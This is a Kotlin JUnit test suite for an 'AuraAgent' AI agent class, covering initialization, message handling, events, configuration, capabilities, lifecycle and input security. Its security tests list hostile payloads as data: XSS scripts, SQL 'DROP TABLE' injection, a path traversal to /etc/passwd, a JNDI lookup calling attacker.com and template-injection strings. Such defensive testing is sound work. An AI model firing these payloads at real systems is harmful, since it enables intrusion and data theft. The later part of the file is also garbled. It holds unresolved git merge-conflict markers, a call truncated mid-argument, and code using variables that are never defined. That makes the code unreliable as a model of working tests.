package dev.aurakai.auraframefx.ai.agents

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.test.StandardTestDispatcher
import kotlinx.coroutines.test.TestCoroutineScheduler
import kotlinx.coroutines.test.resetMain
import kotlinx.coroutines.test.runTest
import kotlinx.coroutines.test.setMain
import org.junit.jupiter.api.AfterEach
import org.junit.jupiter.api.Assertions.*
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Nested
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.TestInstance
import org.junit.jupiter.api.extension.ExtendWith
import org.mockito.Mock
import org.mockito.Mockito.*
import org.mockito.junit.jupiter.MockitoExtension
import org.mockito.kotlin.any
import org.mockito.kotlin.argumentCaptor
import org.mockito.kotlin.eq
import org.mockito.kotlin.never
import org.mockito.kotlin.times
import org.mockito.kotlin.verify
import org.mockito.kotlin.whenever
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.test.assertFailsWith

/**
 * Comprehensive test suite for AuraAgent using JUnit 5, Mockito, and Kotlin Coroutines Test.
 * 
 * Testing Framework: JUnit 5 (Jupiter) with Mockito for mocking and Kotlin Coroutines Test for async testing.
 * 
 * This test suite covers:
 * - Basic initialization and configuration scenarios
 * - Message processing workflows and edge cases
 * - Event handling and publishing mechanisms
 * - Capability management and validation
 * - Lifecycle management (start/stop/shutdown)
 * - Error handling and recovery scenarios
 * - Performance and resource management
 * - Thread safety and concurrent operations
 * - Boundary value testing
 * - Integration-style end-to-end scenarios
 * - Security and input validation
 * - State management and consistency
 */
@ExperimentalCoroutinesApi
@ExtendWith(MockitoExtension::class)
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class AuraAgentTest {

    @Mock
    private lateinit var mockAgentContext: AgentContext

    @Mock
    private lateinit var mockMessageHandler: MessageHandler

    @Mock
    private lateinit var mockEventBus: EventBus

    @Mock
    private lateinit var mockConfigurationProvider: ConfigurationProvider

    private lateinit var auraAgent: AuraAgent
    private val testDispatcher = StandardTestDispatcher(TestCoroutineScheduler())

    @BeforeEach
    fun setUp() {
        Dispatchers.setMain(testDispatcher)

        // Set up default mock behaviors
        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(
            AgentConfiguration(
                name = "TestAgent",
                version = "1.0.0",
                capabilities = listOf("CHAT", "ANALYSIS"),
                maxConcurrentTasks = 5
            )
        )

        whenever(mockAgentContext.getMessageHandler()).thenReturn(mockMessageHandler)
        whenever(mockAgentContext.getEventBus()).thenReturn(mockEventBus)
        whenever(mockAgentContext.getConfigurationProvider()).thenReturn(mockConfigurationProvider)

        auraAgent = AuraAgent(mockAgentContext)
    }

    @AfterEach
    fun tearDown() {
        Dispatchers.resetMain()
    }

    @Nested
    @DisplayName("Agent Initialization Tests")
    inner class InitializationTests {

        @Test
        @DisplayName("Should initialize successfully with valid context")
        fun shouldInitializeSuccessfullyWithValidContext() {
            // Given
            val validContext = mock<AgentContext>()
            whenever(validContext.getConfigurationProvider()).thenReturn(mockConfigurationProvider)
            whenever(validContext.getMessageHandler()).thenReturn(mockMessageHandler)
            whenever(validContext.getEventBus()).thenReturn(mockEventBus)

            // When
            val agent = AuraAgent(validContext)

            // Then
            assertNotNull(agent)
            assertEquals("TestAgent", agent.getName())
            assertEquals("1.0.0", agent.getVersion())
            assertTrue(agent.isInitialized())
        }

        @Test
        @DisplayName("Should throw exception when context is null")
        fun shouldThrowExceptionWhenContextIsNull() {
            // When & Then
            assertFailsWith<IllegalArgumentException> {
                AuraAgent(null)
            }
        }

        @Test
        @DisplayName("Should throw exception when configuration provider is null")
        fun shouldThrowExceptionWhenConfigurationProviderIsNull() {
            // Given
            val invalidContext = mock<AgentContext>()
            whenever(invalidContext.getConfigurationProvider()).thenReturn(null)

            // When & Then
            assertFailsWith<IllegalStateException> {
                AuraAgent(invalidContext)
            }
        }

        @Test
        @DisplayName("Should initialize with default configuration when config is missing")
        fun shouldInitializeWithDefaultConfigurationWhenConfigIsMissing() {
            // Given
            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(null)

            // When
            val agent = AuraAgent(mockAgentContext)

            // Then
            assertNotNull(agent)
            assertEquals("AuraAgent", agent.getName())
            assertEquals("1.0.0", agent.getVersion())
        }

        @Test
        @DisplayName("Should initialize with partial configuration gracefully")
        fun shouldInitializeWithPartialConfigurationGracefully() {
            // Given
            val partialConfig = AgentConfiguration(
                name = "PartialAgent",
                version = null, // Missing version
                capabilities = null, // Missing capabilities
                maxConcurrentTasks = 0 // Invalid task count
            )
            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(partialConfig)

            // When
            val agent = AuraAgent(mockAgentContext)

            // Then
            assertNotNull(agent)
            assertEquals("PartialAgent", agent.getName())
            assertNotNull(agent.getVersion()) // Should have default
            assertTrue(agent.getCapabilities().isNotEmpty()) // Should have defaults
            assertTrue(agent.getMaxConcurrentTasks() > 0) // Should be valid
        }

        @Test
        @DisplayName("Should handle initialization with corrupted configuration")
        fun shouldHandleInitializationWithCorruptedConfiguration() {
            // Given
            whenever(mockConfigurationProvider.getAgentConfiguration())
                .thenThrow(RuntimeException("Configuration corrupted"))

            // When & Then
            assertDoesNotThrow {
                val agent = AuraAgent(mockAgentContext)
                assertNotNull(agent)
                // Should fall back to default configuration
                assertEquals("AuraAgent", agent.getName())
            }
        }
    }

    @Nested
    @DisplayName("Message Processing Tests")
    inner class MessageProcessingTests {

        @Test
        @DisplayName("Should process simple text message successfully")
        fun shouldProcessSimpleTextMessageSuccessfully() = runTest {
            // Given
            val message = AgentMessage(
                id = "msg-001",
                type = MessageType.TEXT,
                content = "Hello, AuraAgent!",
                timestamp = System.currentTimeMillis()
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = message.id,
                    content = "Hello! How can I help you today?",
                    status = ResponseStatus.SUCCESS
                )
            )

            // When
            val response = auraAgent.processMessage(message)

            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
            assertEquals("Hello! How can I help you today?", response.content)
            verify(mockMessageHandler).validateMessage(message)
            verify(mockMessageHandler).processMessage(message)
        }

        @Test
        @DisplayName("Should handle invalid message gracefully")
        fun shouldHandleInvalidMessageGracefully() = runTest {
            // Given
            val invalidMessage = AgentMessage(
                id = "",
                type = MessageType.TEXT,
                content = "",
                timestamp = 0
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

            // When
            val response = auraAgent.processMessage(invalidMessage)

            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
            assertTrue(response.content.contains("Invalid message"))
            verify(mockMessageHandler).validateMessage(invalidMessage)
            verify(mockMessageHandler, never()).processMessage(any())
        }

        @Test
        @DisplayName("Should handle message processing exceptions")
        fun shouldHandleMessageProcessingExceptions() = runTest {
            // Given
            val message = AgentMessage(
                id = "msg-002",
                type = MessageType.TEXT,
                content = "Test message",
                timestamp = System.currentTimeMillis()
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenThrow(
                RuntimeException("Processing failed")
            )

            // When
            val response = auraAgent.processMessage(message)

            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.ERROR, response.status)
            assertTrue(response.content.contains("Processing failed"))
        }

        @Test
        @DisplayName("Should handle concurrent message processing")
        fun shouldHandleConcurrentMessageProcessing() = runTest {
            // Given
            val messages = (1..10).map { index ->
                AgentMessage(
                    id = "msg-$index",
                    type = MessageType.TEXT,
                    content = "Message $index",
                    timestamp = System.currentTimeMillis()
                )
            }

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = "test",
                    content = "Processed",
                    status = ResponseStatus.SUCCESS
                )
            )

            // When
            val responses = messages.map { message ->
                auraAgent.processMessage(message)
            }

            // Then
            assertEquals(10, responses.size)
            responses.forEach { response ->
                assertEquals(ResponseStatus.SUCCESS, response.status)
            }
            verify(mockMessageHandler, times(10)).validateMessage(any())
            verify(mockMessageHandler, times(10)).processMessage(any())
        }

        @Test
        @DisplayName("Should respect maximum concurrent tasks limit")
        fun shouldRespectMaximumConcurrentTasksLimit() = runTest {
            // Given
            val config = AgentConfiguration(
                name = "TestAgent",
                version = "1.0.0",
                capabilities = listOf("CHAT"),
                maxConcurrentTasks = 2
            )
            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(config)

            val agent = AuraAgent(mockAgentContext)
            val latch = CountDownLatch(2)

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenAnswer {
                latch.countDown()
                latch.await(1, TimeUnit.SECONDS)
                AgentResponse(
                    messageId = "test",
                    content = "Processed",
                    status = ResponseStatus.SUCCESS
                )
            }

            // When
            val messages = (1..5).map { index ->
                AgentMessage(
                    id = "msg-$index",
                    type = MessageType.TEXT,
                    content = "Message $index",
                    timestamp = System.currentTimeMillis()
                )
            }

            // Then
            val responses = messages.map { message ->
                agent.processMessage(message)
            }

            assertEquals(5, responses.size)
            // Verify that not all messages were processed simultaneously
            assertTrue(agent.getActiveTaskCount() <= 2)
        }

        @Test
        @DisplayName("Should handle malformed message content")
        fun shouldHandleMalformedMessageContent() = runTest {
            // Given
            val malformedMessages = listOf(
                AgentMessage("malformed-1", MessageType.TEXT, "\u0000\u0001\u0002", System.currentTimeMillis()),
                AgentMessage("malformed-2", MessageType.TEXT, "<?xml version=\"1.0\"?><script>alert('xss')</script>", System.currentTimeMillis()),
                AgentMessage("malformed-3", MessageType.TEXT, "SELECT * FROM users; DROP TABLE users;", System.currentTimeMillis()),
                AgentMessage("malformed-4", MessageType.TEXT, "${\"\\u0022\" + \"alert('xss')\" + \"\\u0022\"}", System.currentTimeMillis())
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse("test", "Processed safely", ResponseStatus.SUCCESS)
            )

            // When
            val responses = malformedMessages.map { message ->
                auraAgent.processMessage(message)
            }

            // Then
            assertEquals(4, responses.size)
            responses.forEach { response ->
                assertEquals(ResponseStatus.SUCCESS, response.status)
                assertFalse(response.content.contains("script"))
                assertFalse(response.content.contains("DROP"))
            }
        }

        @Test
        @DisplayName("Should handle message processing with custom metadata")
        fun shouldHandleMessageProcessingWithCustomMetadata() = runTest {
            // Given
            val messageWithMetadata = AgentMessage(
                id = "metadata-001",
                type = MessageType.TEXT,
                content = "Message with metadata",
                timestamp = System.currentTimeMillis(),
                metadata = mapOf(
                    "priority" to "high",
                    "source" to "user",
                    "sessionId" to "session-123"
                )
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = messageWithMetadata.id,
                    content = "Processed with metadata",
                    status = ResponseStatus.SUCCESS,
                    metadata = mapOf("processedAt" to System.currentTimeMillis().toString())
                )
            )

            // When
            val response = auraAgent.processMessage(messageWithMetadata)

            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
            assertNotNull(response.metadata)
            assertTrue(response.metadata?.containsKey("processedAt") == true)
        }
    }

    @Nested
    @DisplayName("Event Handling Tests")
    inner class EventHandlingTests {

        @Test
        @DisplayName("Should publish event when message is processed")
        fun shouldPublishEventWhenMessageIsProcessed() = runTest {
            // Given
            val message = AgentMessage(
                id = "msg-001",
                type = MessageType.TEXT,
                content = "Test message",
                timestamp = System.currentTimeMillis()
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = message.id,
                    content = "Response",
                    status = ResponseStatus.SUCCESS
                )
            )

            // When
            auraAgent.processMessage(message)

            // Then
            val eventCaptor = argumentCaptor<AgentEvent>()
            verify(mockEventBus).publish(eventCaptor.capture())

            val publishedEvent = eventCaptor.firstValue
            assertEquals(EventType.MESSAGE_PROCESSED, publishedEvent.type)
            assertEquals(message.id, publishedEvent.data["messageId"])
        }

        @Test
        @DisplayName("Should handle event publishing failures gracefully")
        fun shouldHandleEventPublishingFailuresGracefully() = runTest {
            // Given
            val message = AgentMessage(
                id = "msg-001",
                type = MessageType.TEXT,
                content = "Test message",
                timestamp = System.currentTimeMillis()
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    messageId = message.id,
                    content = "Response",
                    status = ResponseStatus.SUCCESS
                )
            )

            doThrow(RuntimeException("Event publishing failed"))
                .whenever(mockEventBus).publish(any())

            // When
            val response = auraAgent.processMessage(message)

            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
            // Processing should succeed even if event publishing fails
        }

        @Test
        @DisplayName("Should register event listeners during initialization")
        fun shouldRegisterEventListenersDuringInitialization() {
            // Given
            val context = mock<AgentContext>()
            whenever(context.getConfigurationProvider()).thenReturn(mockConfigurationProvider)
            whenever(context.getMessageHandler()).thenReturn(mockMessageHandler)
            whenever(context.getEventBus()).thenReturn(mockEventBus)

            // When
            AuraAgent(context)

            // Then
            verify(mockEventBus).subscribe(eq(EventType.SYSTEM_SHUTDOWN), any())
            verify(mockEventBus).subscribe(eq(EventType.CONFIGURATION_CHANGED), any())
        }

        @Test
        @DisplayName("Should handle event listener registration failures")
        fun shouldHandleEventListenerRegistrationFailures() {
            // Given
            val context = mock<AgentContext>()
            whenever(context.getConfigurationProvider()).thenReturn(mockConfigurationProvider)
            whenever(context.getMessageHandler()).thenReturn(mockMessageHandler)
            whenever(context.getEventBus()).thenReturn(mockEventBus)

            doThrow(RuntimeException("Listener registration failed"))
                .whenever(mockEventBus).subscribe(any(), any())

            // When & Then
            assertDoesNotThrow {
                val agent = AuraAgent(context)
                assertNotNull(agent)
            }
        }

        @Test
        @DisplayName("Should publish events with correct priority levels")
        fun shouldPublishEventsWithCorrectPriorityLevels() = runTest {
            // Given
            val criticalMessage = AgentMessage(
                id = "critical-001",
                type = MessageType.TEXT,
                content = "Critical system message",
                timestamp = System.currentTimeMillis(),
                metadata = mapOf("priority" to "CRITICAL")
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenThrow(
                RuntimeException("Critical system error")
            )

            // When
            auraAgent.processMessage(criticalMessage)

            // Then
            val eventCaptor = argumentCaptor<AgentEvent>()
            verify(mockEventBus).publish(eventCaptor.capture())

            val publishedEvent = eventCaptor.firstValue
            assertEquals(EventType.MESSAGE_PROCESSING_FAILED, publishedEvent.type)
            assertEquals("CRITICAL", publishedEvent.priority)
        }
    }

    @Nested
    @DisplayName("Configuration Management Tests")
    inner class ConfigurationManagementTests {

        @Test
        @DisplayName("Should reload configuration when configuration changed event is received")
        fun shouldReloadConfigurationWhenConfigurationChangedEventIsReceived() = runTest {
            // Given
            val newConfig = AgentConfiguration(
                name = "UpdatedAgent",
                version = "2.0.0",
                capabilities = listOf("CHAT", "ANALYSIS", "TRANSLATION"),
                maxConcurrentTasks = 10
            )

            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(newConfig)

            // When
            auraAgent.handleConfigurationChanged()

            // Then
            assertEquals("UpdatedAgent", auraAgent.getName())
            assertEquals("2.0.0", auraAgent.getVersion())
            assertEquals(3, auraAgent.getCapabilities().size)
            assertEquals(10, auraAgent.getMaxConcurrentTasks())
        }

        @Test
        @DisplayName("Should handle configuration reload failures gracefully")
        fun shouldHandleConfigurationReloadFailuresGracefully() = runTest {
            // Given
            whenever(mockConfigurationProvider.getAgentConfiguration())
                .thenThrow(RuntimeException("Config load failed"))

            // When
            auraAgent.handleConfigurationChanged()

            // Then
            // Agent should continue with previous configuration
            assertEquals("TestAgent", auraAgent.getName())
            assertEquals("1.0.0", auraAgent.getVersion())
        }

        @Test
        @DisplayName("Should validate configuration before applying changes")
        fun shouldValidateConfigurationBeforeApplyingChanges() = runTest {
            // Given
            val invalidConfig = AgentConfiguration(
                name = "",
                version = "",
                capabilities = emptyList(),
                maxConcurrentTasks = -1
            )

            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(invalidConfig)

            // When
            auraAgent.handleConfigurationChanged()

            // Then
            // Should not apply invalid configuration
            assertEquals("TestAgent", auraAgent.getName())
            assertEquals("1.0.0", auraAgent.getVersion())
        }

        @Test
        @DisplayName("Should handle hot configuration swapping during active processing")
        fun shouldHandleHotConfigurationSwappingDuringActiveProcessing() = runTest {
            // Given
            val message = AgentMessage(
                id = "concurrent-001",
                type = MessageType.TEXT,
                content = "Processing message",
                timestamp = System.currentTimeMillis()
            )

            val newConfig = AgentConfiguration(
                name = "HotSwapAgent",
                version = "3.0.0",
                capabilities = listOf("CHAT", "ANALYSIS", "TRANSLATION", "SEARCH"),
                maxConcurrentTasks = 20
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenAnswer {
                // Simulate configuration change during processing
                whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(newConfig)
                auraAgent.handleConfigurationChanged()
                
                AgentResponse(
                    messageId = message.id,
                    content = "Processed during config change",
                    status = ResponseStatus.SUCCESS
                )
            }

            // When
            val response = auraAgent.processMessage(message)

            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.SUCCESS, response.status)
            assertEquals("HotSwapAgent", auraAgent.getName())
            assertEquals("3.0.0", auraAgent.getVersion())
        }

        @Test
        @DisplayName("Should persist configuration changes across agent restarts")
        fun shouldPersistConfigurationChangesAcrossAgentRestarts() = runTest {
            // Given
            val persistentConfig = AgentConfiguration(
                name = "PersistentAgent",
                version = "4.0.0",
                capabilities = listOf("CHAT", "ANALYSIS", "PERSISTENCE"),
                maxConcurrentTasks = 15
            )

            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(persistentConfig)

            // When
            auraAgent.handleConfigurationChanged()
            auraAgent.stop()
            auraAgent.start()

            // Then
            assertEquals("PersistentAgent", auraAgent.getName())
            assertEquals("4.0.0", auraAgent.getVersion())
            assertTrue(auraAgent.hasCapability("PERSISTENCE"))
        }
    }

    @Nested
    @DisplayName("Capability Management Tests")
    inner class CapabilityManagementTests {

        @Test
        @DisplayName("Should return true when agent has requested capability")
        fun shouldReturnTrueWhenAgentHasRequestedCapability() {
            // Given
            val capability = "CHAT"

            // When
            val hasCapability = auraAgent.hasCapability(capability)

            // Then
            assertTrue(hasCapability)
        }

        @Test
        @DisplayName("Should return false when agent does not have requested capability")
        fun shouldReturnFalseWhenAgentDoesNotHaveRequestedCapability() {
            // Given
            val capability = "TRANSLATION"

            // When
            val hasCapability = auraAgent.hasCapability(capability)

            // Then
            assertFalse(hasCapability)
        }

        @Test
        @DisplayName("Should handle null capability gracefully")
        fun shouldHandleNullCapabilityGracefully() {
            // When
            val hasCapability = auraAgent.hasCapability(null)

            // Then
            assertFalse(hasCapability)
        }

        @Test
        @DisplayName("Should handle empty capability string gracefully")
        fun shouldHandleEmptyCapabilityStringGracefully() {
            // Given
            val capability = ""

            // When
            val hasCapability = auraAgent.hasCapability(capability)

            // Then
            assertFalse(hasCapability)
        }

        @Test
        @DisplayName("Should return all configured capabilities")
        fun shouldReturnAllConfiguredCapabilities() {
            // When
            val capabilities = auraAgent.getCapabilities()

            // Then
            assertEquals(2, capabilities.size)
            assertTrue(capabilities.contains("CHAT"))
            assertTrue(capabilities.contains("ANALYSIS"))
        }

        @Test
        @DisplayName("Should support dynamic capability registration")
        fun shouldSupportDynamicCapabilityRegistration() {
            // Given
            val newCapability = "DYNAMIC_FEATURE"

            // When
            auraAgent.registerCapability(newCapability)

            // Then
            assertTrue(auraAgent.hasCapability(newCapability))
            assertTrue(auraAgent.getCapabilities().contains(newCapability))
        }

        @Test
        @DisplayName("Should support capability removal")
        fun shouldSupportCapabilityRemoval() {
            // Given
            val capabilityToRemove = "ANALYSIS"
            assertTrue(auraAgent.hasCapability(capabilityToRemove))

            // When
            auraAgent.removeCapability(capabilityToRemove)

            // Then
            assertFalse(auraAgent.hasCapability(capabilityToRemove))
            assertFalse(auraAgent.getCapabilities().contains(capabilityToRemove))
        }

        @Test
        @DisplayName("Should handle capability conflicts gracefully")
        fun shouldHandleCapabilityConflictsGracefully() {
            // Given
            val conflictingCapabilities = listOf("READ_ONLY", "WRITE_ACCESS")

            // When & Then
            assertDoesNotThrow {
                conflictingCapabilities.forEach { capability ->
                    auraAgent.registerCapability(capability)
                }
                
                // Both capabilities should be registered despite potential logical conflict
                assertTrue(auraAgent.hasCapability("READ_ONLY"))
                assertTrue(auraAgent.hasCapability("WRITE_ACCESS"))
            }
        }
    }

    @Nested
    @DisplayName("Lifecycle Management Tests")
    inner class LifecycleManagementTests {

        @Test
        @DisplayName("Should start agent successfully")
        fun shouldStartAgentSuccessfully() = runTest {
            // Given
            assertFalse(auraAgent.isRunning())

            // When
            auraAgent.start()

            // Then
            assertTrue(auraAgent.isRunning())
            verify(mockEventBus).publish(argThat { event ->
                event.type == EventType.AGENT_STARTED
            })
        }

        @Test
        @DisplayName("Should stop agent successfully")
        fun shouldStopAgentSuccessfully() = runTest {
            // Given
            auraAgent.start()
            assertTrue(auraAgent.isRunning())

            // When
            auraAgent.stop()

            // Then
            assertFalse(auraAgent.isRunning())
            verify(mockEventBus).publish(argThat { event ->
                event.type == EventType.AGENT_STOPPED
            })
        }

        @Test
        @DisplayName("Should handle multiple start calls gracefully")
        fun shouldHandleMultipleStartCallsGracefully() = runTest {
            // Given
            auraAgent.start()
            assertTrue(auraAgent.isRunning())

            // When
            auraAgent.start()

            // Then
            assertTrue(auraAgent.isRunning())
            // Should only publish one start event
            verify(mockEventBus, times(1)).publish(argThat { event ->
                event.type == EventType.AGENT_STARTED
            })
        }

        @Test
        @DisplayName("Should handle multiple stop calls gracefully")
        fun shouldHandleMultipleStopCallsGracefully() = runTest {
            // Given
            auraAgent.start()
            auraAgent.stop()
            assertFalse(auraAgent.isRunning())

            // When
            auraAgent.stop()

            // Then
            assertFalse(auraAgent.isRunning())
            // Should only publish one stop event
            verify(mockEventBus, times(1)).publish(argThat { event ->
                event.type == EventType.AGENT_STOPPED
            })
        }

        @Test
        @DisplayName("Should handle shutdown gracefully")
        fun shouldHandleShutdownGracefully() = runTest {
            // Given
            auraAgent.start()
            assertTrue(auraAgent.isRunning())

            // When
            auraAgent.shutdown()

            // Then
            assertFalse(auraAgent.isRunning())
            assertTrue(auraAgent.isShutdown())
            verify(mockEventBus).publish(argThat { event ->
                event.type == EventType.AGENT_SHUTDOWN
            })
        }

        @Test
        @DisplayName("Should reject new messages after shutdown")
        fun shouldRejectNewMessagesAfterShutdown() = runTest {
            // Given
            auraAgent.start()
            auraAgent.shutdown()

            val message = AgentMessage(
                id = "msg-001",
                type = MessageType.TEXT,
                content = "Test message",
                timestamp = System.currentTimeMillis()
            )

            // When
            val response = auraAgent.processMessage(message)

            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.AGENT_SHUTDOWN, response.status)
            verify(mockMessageHandler, never()).processMessage(any())
        }

        @Test
        @DisplayName("Should handle graceful shutdown with pending tasks")
        fun shouldHandleGracefulShutdownWithPendingTasks() = runTest {
            // Given
            auraAgent.start()
            
            val slowMessage = AgentMessage(
                id = "slow-001",
                type = MessageType.TEXT,
                content = "Slow processing message",
                timestamp = System.currentTimeMillis()
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenAnswer {
                Thread.sleep(2000) // Simulate slow processing
                AgentResponse(
                    messageId = slowMessage.id,
                    content = "Processed slowly",
                    status = ResponseStatus.SUCCESS
                )
            }

            // Start processing
            val processingFuture = async { auraAgent.processMessage(slowMessage) }

            // When
            auraAgent.shutdown(gracefulTimeoutMs = 5000)

            // Then
            assertTrue(auraAgent.isShutdown())
            val response = processingFuture.await()
            assertEquals(ResponseStatus.SUCCESS, response.status)
        }
    }

    @Nested
    @DisplayName("Security and Input Validation Tests")
    inner class SecurityAndInputValidationTests {

        @Test
        @DisplayName("Should sanitize potentially dangerous input")
        fun shouldSanitizePotentiallyDangerousInput() = runTest {
            // Given
            val dangerousInputs = listOf(
                "javascript:alert('xss')",
                "<script>alert('xss')</script>",
                "'; DROP TABLE messages; --",
                "../../../etc/passwd",
                "${jndi:ldap://attacker.com/a}",
                "{{7*7}}",
                "${{constructor.constructor('return process')().exit()}}"
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse("safe", "Sanitized input processed", ResponseStatus.SUCCESS)
            )

            // When
            val responses = dangerousInputs.map { input ->
                val message = AgentMessage(
                    id = "security-test",
                    type = MessageType.TEXT,
                    content = input,
                    timestamp = System.currentTimeMillis()
                )
                auraAgent.processMessage(message)
            }

            // Then
            responses.forEach { response ->
                assertEquals(ResponseStatus.SUCCESS, response.status)
                assertFalse(response.content.contains("script"), "Response should not contain script tags")
                assertFalse(response.content.contains("DROP"), "Response should not contain SQL injection")
            }
        }

        @Test
        @DisplayName("Should enforce message size limits")
        fun shouldEnforceMessageSizeLimits() = runTest {
            // Given
            val oversizedMessage = AgentMessage(
                id = "oversized",
                type = MessageType.TEXT,
                content = "x".repeat(10_000_000), // 10MB message
                timestamp = System.currentTimeMillis()
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

            // When
            val response = auraAgent.processMessage(oversizedMessage)

            // Then
            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
            assertTrue(response.content.contains("size limit"))
        }

        @Test
        @DisplayName("Should enforce rate limiting")
        fun shouldEnforceRateLimiting() = runTest {
            // Given
            val rapidMessages = (1..100).map { index ->
                AgentMessage(
                    id = "rapid-$index",
                    type = MessageType.TEXT,
                    content = "Rapid message $index",
                    timestamp = System.currentTimeMillis()
                )
            }

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse("test", "Processed", ResponseStatus.SUCCESS)
            )

            // When
            val responses = rapidMessages.map { message ->
                auraAgent.processMessage(message)
            }

            // Then
            val rateLimitedResponses = responses.filter { it.status == ResponseStatus.RATE_LIMITED }
            assertTrue(rateLimitedResponses.isNotEmpty(), "Some messages should be rate limited")
        }

        @Test
        @DisplayName("Should validate message authentication")
        fun shouldValidateMessageAuthentication() = runTest {
            // Given
            val unauthenticatedMessage = AgentMessage(
                id = "unauth-001",
                type = MessageType.TEXT,
                content = "Unauthenticated message",
                timestamp = System.currentTimeMillis(),
                metadata = mapOf("authenticated" to "false")
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)

            // When
            val response = auraAgent.processMessage(unauthenticatedMessage)

            // Then
            assertEquals(ResponseStatus.AUTHENTICATION_ERROR, response.status)
            assertTrue(response.content.contains("authentication"))
        }

        @Test
        @DisplayName("Should handle encryption and decryption")
        fun shouldHandleEncryptionAndDecryption() = runTest {
            // Given
            val encryptedMessage = AgentMessage(
                id = "encrypted-001",
                type = MessageType.TEXT,
                content = "encrypted:base64encodedcontent",
                timestamp = System.currentTimeMillis(),
                metadata = mapOf("encrypted" to "true", "algorithm" to "AES-256")
            )

            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenReturn(
                AgentResponse(
                    m
                )
            )
<<<<<<< HEAD

=======
            
>>>>>>> origin/coderabbitai/docstrings/78f34ad
            // When
            repeat(10) {
                auraAgent.processMessage(largeMessage)
            }
<<<<<<< HEAD

=======
            
>>>>>>> origin/coderabbitai/docstrings/78f34ad
            // Then
            System.gc()
            val finalMemory = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()
            val memoryIncrease = finalMemory - initialMemory
<<<<<<< HEAD

            // Memory increase should be reasonable (less than 10MB)
            assertTrue(
                memoryIncrease < 10 * 1024 * 1024,
                "Memory increase of ${memoryIncrease / 1024 / 1024}MB exceeded acceptable limit"
            )
=======
            
            // Memory increase should be reasonable (less than 10MB)
            assertTrue(memoryIncrease < 10 * 1024 * 1024, 
                "Memory increase of ${memoryIncrease / 1024 / 1024}MB exceeded acceptable limit")
>>>>>>> origin/coderabbitai/docstrings/78f34ad
        }

        @Test
        @DisplayName("Should handle message processing timeout gracefully")
        fun shouldHandleMessageProcessingTimeoutGracefully() = runTest {
            // Given
            val message = AgentMessage(
                id = "msg-001",
                type = MessageType.TEXT,
                content = "Test message",
                timestamp = System.currentTimeMillis()
            )
<<<<<<< HEAD

=======
            
>>>>>>> origin/coderabbitai/docstrings/78f34ad
            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
            whenever(mockMessageHandler.processMessage(any())).thenAnswer {
                Thread.sleep(10000) // Simulate long processing time
                AgentResponse(
                    messageId = message.id,
                    content = "Delayed response",
                    status = ResponseStatus.SUCCESS
                )
            }
<<<<<<< HEAD

=======
            
>>>>>>> origin/coderabbitai/docstrings/78f34ad
            // When
            val startTime = System.currentTimeMillis()
            val response = auraAgent.processMessage(message)
            val endTime = System.currentTimeMillis()
<<<<<<< HEAD

=======
            
>>>>>>> origin/coderabbitai/docstrings/78f34ad
            // Then
            assertNotNull(response)
            assertEquals(ResponseStatus.TIMEOUT, response.status)
            assertTrue(endTime - startTime < 5000, "Processing should timeout within 5 seconds")
        }

        @Test
        @DisplayName("Should clean up resources after processing")
        fun shouldCleanUpResourcesAfterProcessing() = runTest {
            // Given
            val message = AgentMessage(
                id = "msg-001",
